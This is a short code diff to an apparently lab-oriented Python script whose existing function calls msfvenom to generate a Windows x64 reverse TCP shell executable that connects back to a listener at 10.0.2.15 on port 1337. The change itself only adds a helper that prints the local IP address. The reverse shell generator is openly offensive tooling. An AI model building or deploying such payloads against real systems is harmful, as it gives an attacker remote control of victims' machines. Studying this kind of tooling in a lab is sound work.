@@ -4,6 +4,7 @@
 ### IMPORT STATEMENTS ###
 import sys  # import the sys library
 import subprocess
+import socket
 
 
 ### HELPER FUNCTIONS ###
@@ -19,9 +20,14 @@ def windows_reverse_payload():
     return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
     print("output:", return_code)
 
+def get_ip():
+    print(socket.gethostbyname(socket.gethostname()))
+
+
 ### MAIN FUNCTION ###
 def main():  # define a main function
     windows_reverse_payload()
+    get_ip()
     # open_payloads()
     # get_local()
 
